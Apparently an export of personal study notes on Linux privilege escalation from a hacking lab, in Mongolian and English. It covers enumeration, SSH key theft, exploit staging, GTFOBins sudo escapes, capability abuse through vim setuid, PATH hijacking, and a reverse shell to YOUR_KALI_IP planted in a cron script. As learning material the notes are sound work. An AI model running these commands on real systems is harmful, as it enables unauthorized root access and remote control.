    "status": "Draft",
    "readTime": "6 min",
    "date": "KS import",
    "excerpt": "KS source: linux prev fundd/linux prev.md",
    "content": "# 🏠 SCENE: Чи Linux машин дотор орчихлоо\n\nЧи SSH, exploit, web shell гэх мэтээр аль нэг аргаар shell авлаа гэж бодъё.\n\nОдоо:\n\n```\n👤 YOU\n  ↓\n💻 Linux Machine\n```\n\nГэхдээ чи юу ч мэдэхгүй.\n\n```\n❓ Ямар machine?\n❓ Би хэн бэ?\n❓ Root байж болох уу?\n❓ Ямар хэрэглэгчид байна?\n❓ Сонирхолтой файл байна уу?\n❓ Ямар service ажиллаж байна?\n❓ Root-оор ажилладаг job байна уу?\n❓ Надад бичих permission байгаа газар байна уу?\n❓ Kernel хуучин уу?\n```\n\nТэгээд энэ checklist гарч ирнэ.\n\n---\n\n# 🎬 1. “БИ ХААНА БАЙНА?”\n\nЭхний 5 command бол **GPS + паспорт**.\n\n```\nid\nhostname\nuname -a\ncat /etc/os-release\npwd\n```\n\n---\n\n## 🪪 `id`\n\n```\nid\n```\n\nЭнэ бол:\n\n> **“Би яг хэн бэ?”**\n\nгэсэн асуулт.\n\nЖишээ:\n\n```\nuid=1000(karen) gid=1000(karen) groups=...\n```\n\nЧи:\n\n```\n👤 Karen\nUID = 1000\n```\n\nгэж мэднэ.\n\nХарин:\n\n```\nuid=0(root)\n```\n\nгарвал:\n\n```\n👑 OMG, би аль хэдийн root!\n```\n\nТиймээс **хамгийн эхний асуулт = би ямар эрхтэй вэ?**\n\n### 🧠 Memory\n\n> `id` = **Identity**\n\n---\n\n# 🏷️ `hostname`\n\n```\nhostname\n```\n\nЭнэ:\n\n> **“Энэ машины нэр юу вэ?”**\n\nЖишээ:\n\n```\nweb-server-01\n```\n\nТэгэхээр:\n\n```\n👤 Би = Karen\n🏠 Байшин = web-server-01\n```\n\n### 🧠 Memory\n\n> `hostname` = **House name**\n\n---\n\n# 🧬 `uname -a`\n\n```\nuname -a\n```\n\nЭнэ бол машины **рентген зураг** шиг.\n\nЧи kernel болон системийн ерөнхий мэдээлэл авна.\n\nЖишээ:\n\n```\nLinux web-server 5.x.x ... x86_64 ...\n```\n\nЧамд:\n\n```\n🐧 Linux\n🧠 Kernel version\n💻 Architecture\n```\n\nгэх мэт зүйлс харагдана.\n\n### 🧠 Memory\n\n> `uname` = **“What is this machine made of?”**\n\n---\n\n# 📋 `cat /etc/os-release`\n\n```\ncat /etc/os-release\n```\n\nЭнэ нь:\n\n> **“Яг ямар Linux distribution вэ?”**\n\nгэдгийг хэлнэ.\n\nЖишээ:\n\n```\nUbuntu\nDebian\nFedora\n...\n```\n\nТэгэхээр:\n\n```\nuname -a\n   ↓\nKernel\n\n/etc/os-release\n   ↓\nDistribution\n```\n\n### Ялгааг анзаараарай\n\n```\n🐧 Linux\n  │\n  ├── Kernel → uname -a\n  │\n  └── Distribution → /etc/os-release\n```\n\n---\n\n# 📍 `pwd`\n\n```\npwd\n```\n\nЭнэ:\n\n> **“Би яг аль өрөөнд зогсож байна?”**\n\nгэж асууж байна.\n\nЖишээ:\n\n```\n/home/karen\n```\n\nТэгэхээр:\n\n```\n🏠 Машин\n └── 📂 home\n      └── 📂 karen\n            ↑\n           YOU\n```\n\n---\n\n# 🧠 Эдгээр 5-ыг нэг зураг болго\n\n```\n        🕵️ YOU ENTERED MACHINE\n                 │\n       ┌─────────┼─────────┐\n       ↓         ↓         ↓\n      WHO       WHERE      WHAT\n       │         │         │\n      id      hostname   uname\n       │                    │\n       │               /etc/os-release\n       │\n       └─────── pwd ────────\n```\n\n## Memory:\n\n> **ID → NAME → KERNEL → OS → LOCATION**\n\nэсвэл:\n\n> **“Би хэн бэ → ямар машин → ямар kernel → ямар OS → хаана байна?”**\n\n---\n\n# 🎬 2. USER & PRIVILEGE ENUMERATION\n\nОдоо чи байшингаа танилаа.\n\nДараагийн асуулт:\n\n> **“Энд өөр хэн байна, би юу хийж чадах вэ?”**\n\n---\n\n# 👥 `/etc/passwd`\n\n```\ncat /etc/passwd\n```\n\nЭнэ бол Linux-ийн **хэрэглэгчдийн бүртгэлийн дэвтэр** гэж төсөөл.\n\n```\nroot\nalice\nbob\nkaren\n...\n```\n\nБодит password-ууд энд байх ёстой гэж ойлгож болохгүй; энэ файл нь account information агуулдаг.\n\nТөсөөл:\n\n```\n🏢 Company employee list\n\nAlice\nBob\nKaren\nAdmin\nBackup\nServiceAccount\n...\n```\n\n### Яагаад сонирхолтой вэ?\n\nУчир нь зарим account:\n\n```\n👤 normal user\n🤖 service account\n👑 root\n```\n\nбайж болно.\n\n---\n\n# 👪 `/etc/group`\n\n```\ncat /etc/group\n```\n\nХэрэв `/etc/passwd`:\n\n> **“Хэн хэн байна?”**\n\nгэвэл `/etc/group`:\n\n> **“Хэн хэнтэй нэг багт байна?”**\n\nгэдэг.\n\nЖишээ:\n\n```\ndocker:x:999:karen\nsudo:x:27:karen\n```\n\nгэх мэт.\n\nТөсөөл:\n\n```\nKaren\n ├── sudo group\n ├── docker group\n └── developers group\n```\n\nGroup membership заримдаа privilege-ийн хувьд маш чухал.\n\n---\n\n# 👑 `sudo -l`\n\n```\nsudo -l\n```\n\nЭнэ бол:\n\n> **“Надад админ ямар тусгай зөвшөөрөл өгсөн бэ?”**\n\nгэдэг асуулт.\n\nЖишээ:\n\n```\nUser karen may run:\n    /usr/bin/some-program\n```\n\nЧи тэгэхээр:\n\n```\n🔑 My permissions\n```\n\nгэсэн жагсаалт харж байна.\n\n### 🧠 Memory\n\n> `sudo -l` = **“What am I allowed to borrow from root?”**\n\n---\n\n# 🧟 SUID\n\n```\nfind / -perm -4000 -type f 2>/dev/null\n```\n\nЭнийг ойлгохын тулд **хаалганы тусгай түлхүүр** гэж төсөөл.\n\nЕрдийн executable:\n\n```\n👤 Karen\n ↓\nprogram\n ↓\nKaren эрхээр ажиллана\n```\n\nSUID executable:\n\n```\n👤 Karen\n ↓\n🔑 SUID program\n ↓\n👑 File owner's privilege\n```\n\nЖишээ нь root owner бол:\n\n```\nSUID root program\n```\n\nажиллах үед тусгай privileged behavior гарч болно.\n\n### `4000` гэж?\n\n```\n4000\n ↑\nSUID bit\n```\n\n### 🧠 Memory\n\n> **SUID = “Run wearing the owner's ID.”**\n\n---\n\n# 👥 SGID\n\n```\nfind / -perm -2000 -type f 2>/dev/null\n```\n\nҮүнтэй төстэй боловч group identity-тэй холбоотой.\n\n```\n4000 → SUID\n2000 → SGID\n```\n\n### 🧠 Memory\n\n> **SUID = user**\n> \n> **SGID = group**\n\n---\n\n# 🪪 Linux Capabilities\n\n```\ngetcap -r / 2>/dev/null\n```\n\nЭнэ бүр илүү сонирхолтой.\n\nRoot гэдэг нь:\n\n```\n👑 MASTER KEY\n```\n\nгэж төсөөл.\n\nCapabilities бол:\n\n```\n🔑 \"Only one special power\"\n```\n\nЖишээ:\n\n```\nProgram\n ├── special network power\n ├── special UID-changing power\n └── ...\n```\n\nөөрөөр хэлбэл:\n\n> **“Бүх эрх биш, тодорхой нэг root-like capability өгсөн.”**\n\n---\n\n# 🎬 3. INTERESTING FILES & CREDENTIALS\n\nОдоо чи:\n\n> “Хаана нууц юм байна?”\n\nгэж хайна.\n\nЭнэ хэсгийг би **🏠 “байшинг нэгжих”** гэж төсөөлдөг.\n\n---\n\n# 📄 Config files\n\n```\nfind / -name \"*.conf\" -o -name \"*.config\" 2>/dev/null | head -20\n```\n\nConfig file = **program-ын зааврын дэвтэр**.\n\nЖишээ:\n\n```\ndatabase.conf\nweb.config\napp.conf\n```\n\nДотор нь:\n\n```\ndatabase = ...\nusername = ...\npassword = ...\n```\n\nгэх мэт sensitive information **байж болох** учраас шалгана.\n\n---\n\n# 🌐 Web application secrets\n\n```\nfind /var/www -type f -name \"*.php\" 2>/dev/null | xargs grep -i \"password\\|passwd\\|pwd\" 2>/dev/null\n```\n\nЭнэ:\n\n> **“Web application-ийн код дотор password-тэй холбоотой зүйл байна уу?”**\n\nгэж хайж байна.\n\nТөсөөл:\n\n```\n/var/www\n   ↓\nwebsite source\n   ↓\nconfig\n   ↓\ndatabase credentials?\n```\n\n---\n\n# 🧠 Bash history\n\n```\ncat ~/.bash_history\n```\n\nЭнэ бол:\n\n> **“Энэ хэрэглэгч өмнө нь terminal дээр юу бичиж байсан бэ?”**\n\nгэсэн асуулт.\n\nХүмүүс хааяа command line дээр:\n\n```\nmysql ...\nssh ...\nexport ...\npassword ...\n```\n\nгэх мэт sensitive зүйл биччихдэг.\n\nТэгээд history нь:\n\n🗒️ **“Өнгөрсөн үйлдлийн дурсамж”**\n\nболно.\n\n---\n\n# 👥 Бусдын history\n\n```\ncat /home/*/.bash_history 2>/dev/null\n```\n\nЭнэ бол:\n\n> “Зөвхөн өөрийнхөө биш, бусад user-ийн history харагдаж байна уу?”\n\nгэж шалгаж байна.\n\n---\n\n# 🔑 Password search\n\n```\ngrep -r \"password\" /var/www/ 2>/dev/null\n```\n\nЭнгийнээр:\n\n> **“Web directory дотор password гэдэг үг хаа хаана байна?”**\n\n---\n\n# 🎬 4. PROCESSES & SERVICES\n\nОдоо:\n\n> **“Одоогоор энэ байшин дотор юу хөдөлж байна?”**\n\n---\n\n# 👀 `ps aux`\n\n```\nps aux\n```\n\nЭнэ бол **building-ийн CCTV monitor**.\n\nОдоогоор ямар process ажиллаж байна?\n\n```\nnginx\napache\nmysql\npython\nbackup\n...\n```\n\nгэх мэт.\n\n---\n\n# 👑 Root processes\n\n```\nps aux | grep root\n```\n\nЭнэ:\n\n> **“Root ямар process ажиллуулж байна?”**\n\nгэж харж байна.\n\nХэрэв:\n\n```\nroot    backup-script\nroot    custom-service\n```\n\nгэх мэт сонирхолтой зүйл байвал анхаарна.\n\n---\n\n# 🚪 Listening ports\n\n```\nnetstat -tulnp\n```\n\nэсвэл:\n\n```\nss -tulnp\n```\n\nЭнэ бол:\n\n> **“Байшингийн ямар хаалганууд гадна тал руу нээлттэй байна?”**\n\nгэж харахтай адил.\n\nЖишээ:\n\n```\n22    SSH\n80    HTTP\n3306  MySQL\n...\n```\n\nТөсөөл:\n\n```\n🏠 MACHINE\n\n🚪 22\n🚪 80\n🚪 3306\n🚪 8080\n```\n\nАль service аль port дээр сонсож байгааг ойлгоно.\n\n---\n\n# 🎬 5. CRON JOBS\n\nЭнэ хэсгийг ойлгох хамгийн сайн арга:\n\n# ⏰ “РОБОТ ЦАГ”\n\nCron =:\n\n> **“Тодорхой цаг болоход автоматаар ажилладаг ажил.”**\n\nЖишээ:\n\n```\n02:00 AM\n   ↓\nbackup.sh\n```\n\nТөсөөл:\n\n```\n⏰ Every night\n      ↓\n🤖 Robot wakes up\n      ↓\nruns backup\n```\n\n---\n\n## `/etc/crontab`\n\n```\ncat /etc/crontab\n```\n\nCron-ийн schedule харна.\n\n---\n\n## `/etc/cron.*`\n\n```\nls -la /etc/cron.*\n```\n\nБусад scheduled job directories.\n\n---\n\n## `crontab -l`\n\n```\ncrontab -l\n```\n\nОдоогийн user-ийн cron jobs.\n\n---\n\n## `/var/spool/cron/`\n\n```\nls -la /var/spool/cron/\n```\n\nCron configuration-ийн өөр нэг байрлал.\n\n---\n\n# 💡 Яагаад cron сонирхолтой вэ?\n\nЭндээс хоёр асуулт гарна:\n\n```\n🤖 What runs automatically?\n        +\n👑 Who runs it?\n        +\n✍️ Can I modify what it runs?\n```\n\nЖишээ mental model:\n\n```\nroot\n ↓\n⏰ cron\n ↓\n/some/script.sh\n```\n\nХэрэв script нь user-д writable байвал:\n\n```\n👤 YOU\n   ↓\n✍️ modify script\n   ↓\n⏰ cron\n   ↓\n👑 root runs script\n```\n\nИнгэж **privilege escalation-ийн боломж** гарч болно.\n\n---\n\n# 🎬 6. WRITABLE LOCATIONS\n\nОдоо асуулт:\n\n> **“Би хаана юм өөрчилж чаддаг вэ?”**\n\n---\n\n```\nfind / -writable -type d 2>/dev/null | grep -v proc\n```\n\n= writable directories.\n\n```\nfind / -writable -type f 2>/dev/null | grep -v proc\n```\n\n= writable files.\n\n---\n\n# 🔓 Яагаад WRITE permission ийм чухал вэ?\n\nЧи:\n\n```\n👀 READ\n```\n\nэрхтэй байвал:\n\n> “Би харж чадна.”\n\nХарин:\n\n```\n✍️ WRITE\n```\n\nэрхтэй байвал:\n\n> “Би өөрчилж чадна.”\n\nТэгээд system чиний өөрчилсөн зүйлийг **илүү өндөр эрхтэй процесс ажиллуулдаг** эсэхийг шалгах хэрэгтэй болдог.\n\nТиймээс writable location өөрөө “vulnerability” биш.\n\nХарин:\n\n```\nWRITE\n  +\nPRIVILEGED EXECUTION\n  +\nTRUST\n```\n\nболбол сонирхолтой болно.\n\n---\n\n# 🎬 7. KERNEL & VERSION\n\nСүүлд:\n\n> **“Machine-ийн суурь өөрөө хуучин, эмзэг юм биш биз?”**\n\nгэж шалгана.\n\n```\nuname -a\ncat /proc/version\n```\n\nЭдгээр нь kernel-ийн талаар илүү мэдээлэл өгнө.\n\nДараа нь:\n\n```\nsearchsploit ubuntu 16.04\n```\n\nгэж байгаа хэсгийн санаа нь:\n\n> **“Энэ software/version-тэй холбоотой public exploit мэдээлэл байна уу?”**\n\nгэж хайх.\n\nГэхдээ `searchsploit` олдсон exploit гэдэг нь:\n\n> **“Яг одоо ажиллана”**\n\nгэсэн үг биш.\n\nЭхлээд:\n\n```\nVersion\nArchitecture\nPatch level\nConfiguration\nExploit requirements\n```\n\nзэрэг нь таарч байгаа эсэхийг шалгана.\n\n---\n\n# 🧠 ОДОО БҮХ CHECKLIST-ИЙГ НЭГ ТҮҮХ БОЛГОЁ\n\nЧи нэг танихгүй байшинд орлоо.\n\n## 🕵️ STEP 1 — “Би хаана байна?”\n\n```\nid\nhostname\nuname -a\ncat /etc/os-release\npwd\n```\n\n```\n🪪 WHO AM I?\n🏠 WHICH MACHINE?\n🧠 WHICH KERNEL?\n🐧 WHICH OS?\n📍 WHERE AM I?\n```\n\n---\n\n## 👥 STEP 2 — “Энд хэн байна?”\n\n```\n/etc/passwd\n/etc/group\nsudo -l\n```\n\n```\n👥 USERS\n👪 GROUPS\n🔑 MY PRIVILEGES\n```\n\n---\n\n## 🔐 STEP 3 — “Нууц зүйл байна уу?”\n\n```\nconfigs\nhistory\nweb files\ncredentials\n```\n\n```\n📄 CONFIGS\n🧠 HISTORY\n🔑 SECRETS\n```\n\n---\n\n## 👀 STEP 4 — “Юу ажиллаж байна?”\n\n```\nps aux\nss -tulnp\n```\n\n```\n⚙️ PROCESSES\n🚪 PORTS\n```\n\n---\n\n## ⏰ STEP 5 — “Юу автоматаар ажилладаг вэ?”\n\n```\ncron\n```\n\n```\n⏰ SCHEDULED JOBS\n```\n\n---\n\n## ✍️ STEP 6 — “Би юуг өөрчилж чадна?”\n\n```\nfind writable\n```\n\n```\n✍️ WRITE ACCESS\n```\n\n---\n\n## 🧬 STEP 7 — “Систем өөрөө хуучин уу?”\n\n```\nuname\n/proc/version\nsearchsploit\n```\n\n```\n🧠 KERNEL\n📦 VERSION\n💥 KNOWN VULNS\n```\n\n---\n\n# 🔥 Нэг мөрөөр цээжлэх\n\nЭнэ бүхнийг би чамд ингэж цээжлүүлэхийг зөвлөе:\n\n> **WHO → WHERE → PRIVILEGE → SECRETS → PROCESSES → PORTS → CRON → WRITE → KERNEL**\n\nэсвэл бүр:\n\n```\n👤 WHO AM I?\n   ↓\n🏠 WHERE AM I?\n   ↓\n👑 WHAT CAN I DO?\n   ↓\n🔑 WHAT SECRETS EXIST?\n   ↓\n⚙️ WHAT IS RUNNING?\n   ↓\n🚪 WHAT IS OPEN?\n   ↓\n⏰ WHAT RUNS AUTOMATICALLY?\n   ↓\n✍️ WHAT CAN I MODIFY?\n   ↓\n🧬 IS THE SYSTEM OLD/VULNERABLE?\n```",
    "sourcePath": "linux prev fundd/linux prev.md"
  },
  {
    "id": 10018,
    "title": "SSH",
    "room": "linux prev fundd",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "linux-prev-fundd",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: linux prev fundd/SSH.md",
    "content": "📂 STREAMLINED OBSIDIAN VAULT ENTRY\n\nTitle: Linux PrivEsc - Sensitive File Hunting (SSH Keys)\nTags: #Linux #PrivEsc #SSH #AsymmetricCrypto #Keys #Reconnaissance\n```\n> ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i id_rsa root@10.49.158.131\n```\n> ```\n>     Asymmetric Pair Logic: authorized_keys holds the public padlock; id_rsa holds the private key that bypasses password authentication.\n> \n>     Enumeration Commands (Searching the Filesystem):\n> ```\n```\n\n        Hunt Private Keys:\n>          find / -name id_rsa 2>/dev/null\n\n        Hunt Authorized Keys:\n        find / -name authorized_keys 2>/dev/null\n\n        Hunt Backup Keys:\n        find / -name \"*.key\" -o -name \"*.pem\" 2>/dev/null\n```\n\n> ```\n>     Mandatory SSH Client Permissions: ==chmod 600 id_rsa== (or 400). OpenSSH strictly rejects private keys with group/world-readable permissions.\n> \n> ```\n```\n    Authentication Command: ==ssh -i id_rsa root@[TARGET_IP]==\n```",
    "sourcePath": "linux prev fundd/SSH.md"
  },
  {
    "id": 10019,
    "title": "attack 3",
    "room": "linux prev",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "linux-prev",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: linux prev/attack 3.md",
    "content": "endees bi find commandas base64 geh ymar ch permission tai file yug ch olj chdsanaar buh amjiltai bolgoson ghde endes neg sul tal garsn hedi buh user orson hen ch root erh bhgvi bsn buguud mini anzaragvi zuil ni ahni base64 commandar l avch boloh baisin bnlee, ",
    "sourcePath": "linux prev/attack 3.md"
  },
  {
    "id": 10020,
    "title": "attack",
    "room": "linux prev",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "linux-prev",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: linux prev/attack.md",
    "content": "ene deer ehleed linux version medej avsan, daraa ni google search hiij vulnrbility haij olood tataj avsan , tegeed daisnii server deer tataj avch ashiglah heregtei uchir ni ene zaaval daisni dotor orj baij ajildag file baisan buguud python3 -m http.server 8080 port serveer neej ugsun unii daraa daisnii cd /tmp orson tendees exploit tataj avch gcc run hiij chmod erh ugj tegeed ashiglasan\n\n📂 STREAMLINED OBSIDIAN VAULT ENTRY\n\nCopy this high-density reference card into your vault:\n\n> ==**Title: Payload Staging & Compilation Mechanics**==\nTags: #Linux #PrivEsc #Staging #Compilation #GCC #Python\n> \n> ```\n>     ==**HTTP Staging Server (Kali): python3 -m http.server [PORT] (Turns current directory into an immediate HTTP file server).==**\n> ```\n> \n> ```\n>     **==Target Landing Zone (/tmp): World-writable directory with sticky bit permissions (1777), allowing low-privilege users to stage tools without permission errors.**==\n> ```\n\n    Compilation (gcc): Translates C source code into target machine binaries.\n> \n> ```\n>         ==gcc -O2 exploit.c -o exploit==\n> ```\n\n        ==**-O2 = Compiler optimization level 2 (critical for race condition timing in kernel exploits).**==\n\n>         **==-o [name] = Output binary name.==**",
    "sourcePath": "linux prev/attack.md"
  },
  {
    "id": 10021,
    "title": "attack2",
    "room": "linux prev",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "linux-prev",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: linux prev/attack2.md",
    "content": "ene bugd buruu buguud sudo -l geh commandaas uurin ashiglaj boloh commanda harj uunige ashiglaj oslon\n",
    "sourcePath": "linux prev/attack2.md"
  },
  {
    "id": 10022,
    "title": "attack4",
    "room": "linux prev",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "linux-prev",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: linux prev/attack4.md",
    "content": "📂 STREAMLINED OBSIDIAN VAULT ENTRY\n\nCopy this high-density card into your vault:\n\n> ==**Title: Linux PrivEsc - Linux Capabilities (getcap)**==\nTags: #Linux #PrivEsc #Capabilities #getcap #setcap #GTFOBins\n\n> ```\n>     Concept: Granular root privilege division stored in file extended attributes (xattr), bypassing SUID permission indicators.\n> ```\n> \n>     ==**Enumeration Command: \n```\n>     getcap -r / 2>/dev/null\n```\n\n>     ==**The Flags: \n>     e = Effective,\n>      p = Permitted, \n>      i = Inheritable.**==\n\n```\nvim -c 'some command'\n```\n\n> ==**It means:==**\n> \n> **==1. Start vim==**\n> **==2. Immediately run the command you gave after -c==**\n> **==3. Then continue**==\n\n```\n/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n```",
    "sourcePath": "linux prev/attack4.md"
  },
  {
    "id": 10023,
    "title": "attack5",
    "room": "linux prev",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "linux-prev",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: linux prev/attack5.md",
    "content": "\n> ```\n> REVERSE SHELL\n> ```\n```\n> echo '#!/bin/bash bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1' > /home/karen/backup.sh\n```\n```\nchmod +x /home/karen/backup.sh\n```\n\n> ```\n> python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n> ```\n> ```\n> ==a. sudo find /bin -name nano -exec /bin/sh \\;==\n> ==b. sudo awk 'BEGIN {system(\"/bin/sh\")}'==\n> ==c. echo \"==\n> ==.execute('/bin/sh')\" > shell.nse && sudo==\n> ==--script=shell.nse==\n> ==d. sudo vim -c '!sh'==\n> ```",
    "sourcePath": "linux prev/attack5.md"
  },
  {
    "id": 10024,
    "title": "attack6",
    "room": "linux prev",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "linux-prev",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: linux prev/attack6.md",
    "content": "📂 STREAMLINED OBSIDIAN VAULT ENTRY\n\n> ```\n> Title: Linux PrivEsc - PATH Hijacking (SUID Context)\n> ```\n> **==Tags: #Linux #PrivEsc #PATH #SUID #EnvironmentVariables==**\n\n>         ==**Inspect User's PATH:**==\n```\necho $PATH\n```\n\n> ```\n>         ==**Find Writable Directories:**== \n> ```\n```\nfind / -writable -type d 2>/dev/null\n```\n\n> ```\n>         Find SUID Binaries: \n> ```\n```\nfind / -perm -u=s -type f 2>/dev/null\n```\n\n>     **==**Exploitation Pattern:**==**\n> ```\n> \n>         Identify unquoted binary call inside SUID program (via strings [binary]).\n> \n>         Prepend writable directory to PATH: ==export PATH=/tmp:$PATH== (or use existing writable PATH directory).\n> \n>         Create malicious payload with target name in that folder: \n```\n>         echo '/bin/bash -p' > /tmp/[target_cmd] && chmod +x /tmp/[target_cmd]\n```\n\n```\n# 1. Add a writable folder to the beginning of your PATH\nexport PATH=/tmp:$PATH\n\n# 2. Create a fake \"thm\" that gives a root shell\necho '#!/bin/bash\n/bin/bash -p' > /tmp/thm\n\n# 3. Make it executable\nchmod +x /tmp/thm\n\n# 4. Run the SUID binary\n/home/murdoch/test\n```",
    "sourcePath": "linux prev/attack6.md"
  },
  {
    "id": 10025,
    "title": "most important site",
    "room": "linux prev",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "linux-prev",
      "personal-note"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: linux prev/most important site.md",
    "content": "https://gtfobins.github.io.\n\n📂 MASTER OBSIDIAN VAULT ENTRY (Save This)\n\nCopy this consolidated field manual entry into your vault under Linux Privilege Escalation:\n\nTitle: Master Field Manual - Linux Local Privilege Escalation\nTags: #Linux #PrivEsc #CheatSheet #SUID #Sudo #Capabilities #Cron #NFS #Kernel\n\n> ```\n>     Triage Priority Sequence:\n> \n>         ==sudo -l==\n> \n>                 \n>         →→\n> \n>               \n> \n>         Check GTFOBins for shell escapes.\n> \n>         ==find / -perm -u=s -type f 2>/dev/null==\n> \n>                 \n>         →→\n> \n>               \n> \n>         SUID binaries.\n> \n>         ==getcap -r / 2>/dev/null==\n> \n>                 \n>         →→\n> \n>               \n> \n>         Binaries with cap_setuid+ep.\n> \n>         ==cat /etc/crontab==\n> \n>                 \n>         →→\n> \n>               \n> \n>         Check for writable scripts / relative paths.\n> \n>         ==ls -la /etc/passwd /etc/shadow==\n> \n>                 \n>         →→\n> \n>               \n> \n>         Writable passwd or readable shadow.\n> \n>         ==cat /etc/exports==\n> \n>                 \n>         →→\n> \n>               \n> \n>         Look for no_root_squash.\n> \n>         ==uname -a==\n> \n>                 \n>         →→\n> \n>               \n> \n>         Kernel version matching against Exploit-DB (Last resort).\n> ```",
    "sourcePath": "linux prev/most important site.md"
  },
  {
    "id": 10026,
    "title": "mount",
    "room": "linux prev",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "linux-prev",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: linux prev/mount.md",
    "content": "| **Command**                           | **Meaning**                                 |\n| ------------------------------------- | ------------------------------------------- |\n| **`showmount -e IP`**                 | **List available NFS shares on the target** |\n| **`mkdir /tmp/nfs`**                  | **Create a local folder to mount into**     |\n| **`mount -t nfs IP:/share /tmp/nfs`** | **Mount the remote share**                  |\n| **`df -h`**                           | **Check if the mount was successful**       |\n| **`ls /tmp/nfs`**                     | **See the content of the mounted share**    |\n| **`umount /tmp/nfs`**                 | **Unmount the share when finished**         |\n| **`mount \\| grep nfs`**               | **See currently mounted NFS shares**        |\n\n**Common useful options:**\n\n| **Option**  | **Purpose**                              |\n| ------- | ------------------------------------ |\n| **-o name** | **Set the name of the output file**      |\n| **-Wall**   | **Show all warnings**                    |\n| **-g**      | **Include debugging information**        |\n| **-m32**    | **Compile as 32-bit (sometimes needed)** |\n| **-static** | **Create a static binary**               |\n\n**Example:**\n\nBash\n\n> ```\n> gcc shell.c -o shell          # Simple compile\n> gcc -Wall shell.c -o shell    # Compile with warnings\n> ```",
    "sourcePath": "linux prev/mount.md"
  },
  {
    "id": 10027,
    "title": "Tools",
    "room": "linux prev",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "linux-prev",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: linux prev/Tools.md",
    "content": "📂 STREAMLINED OBSIDIAN VAULT ENTRY\n\nCopy this high-density reference card into your vault:\n\n> ==**Title: Linux Local Enumeration (Post-Compromise)**==\nTags: #Linux #PrivEsc #Enumeration #CLI #Netstat #Find\n\n>     ==**System & Kernel Info:**==\n\n> ```\n>         Kernel Release: ==uname -a== or ==cat /proc/version==\n> \n>         OS Distribution: ==cat /etc/issue== or ==cat /etc/os-release==\n> ```\n\n>     ==**User & Permissions Context:**==\n\n> ```\n>         Current ID & Groups: ==id==\n> \n>         Sudo Privileges: ==sudo -l==\n> \n>         System Users: ==cat /etc/passwd | grep -E \"home|sh$\"==\n> ```\n\n>     ==**Network & Internal Sockets:**==\n\n> ```\n>         Listening Ports: ==netstat -tlpn== or ==ss -tulpn==\n> \n>         Routing Table: ==ip route==\n> ```\n\n>     ==**Precision File Hunting (find):**==\n\n> ```\n>         SUID Binaries: \n>         \n>         find / -perm -u=s -type f 2>/dev/null\n>         \n>         find / -type f -perm -04000 -ls 2>/dev/null\n>         \n>         find / -type f -name \"*flag*\" 2>/dev/null\n>         \n>         find / -name \"root.txt\" 2>/dev/null\n>         \n> \n>         World-Writable Directories: ==\n>         find -w/ ritable -type d 2>/dev/null==\n> ```\n\n\n### 1. What SUID actually means\n\nWhen a binary has the **SUID bit** set (you see rws instead of rwx in the permissions), it runs with the privileges of the **file owner**, not the user who ran it.\n\nIn your case:\n\nBash\n\n```\n-rwsr-xr-x 1 root root ... /usr/bin/base64\n```\n\nThis means: When **any** user runs /usr/bin/base64, the program temporarily becomes **root**.\n\nThat is why SUID binaries are dangerous and very useful for privilege escalation.",
    "sourcePath": "linux prev/Tools.md"
  },
  {
    "id": 10028,
    "title": "N2",
    "room": "KS",
    "source": "Cyber",
    "stage": "Pro Arena",
    "tags": [
      "ks-import",
      "personal-note"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: N2.md",
    "content": "https://www.renshuu.org/index.php?page=quiz/liquid_quiz_pre\nhttps://www.scribd.com/document/948612204/Shin-Kanzen-Master-n2-Goi\nhttps://www.youtube.com/watch?v=tpBplRw9nPo&list=PLmfiO-Jszu_gFC2RxFwQJqBvG17gGlSD3\nene bugdees harch uzvel odoo anki 2 deck harch yvaad mun deerees ni renshuu gdg site goon hiih heregtei ym bn, ai helsen zuv ldu, kanji deck bhgvi bn, odoogoor min tolgoi uvdugsun gants zuil ni ene 3 nomo yah ve, mini bodloor reading voc harchval boloh geed bdg shaa2 yadin al pisd tolgoi uvdu shachlaa zgr reading tultal ni huuhuud ychyu, uu tgd listening odoo tgej bgad uchirig ni olohoos al pisd\n",
    "sourcePath": "N2.md"
  },
  {
    "id": 10029,
    "title": "cheatshit",
    "room": "NETWORK/gojo's domain",
    "source": "Cyber",
    "stage": "Live Fire",
    "tags": [
      "ks-import",
      "network",
      "gojos-domain",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "3 min",
    "date": "KS import",
    "excerpt": "KS source: NETWORK/gojo's domain/cheatshit.md",
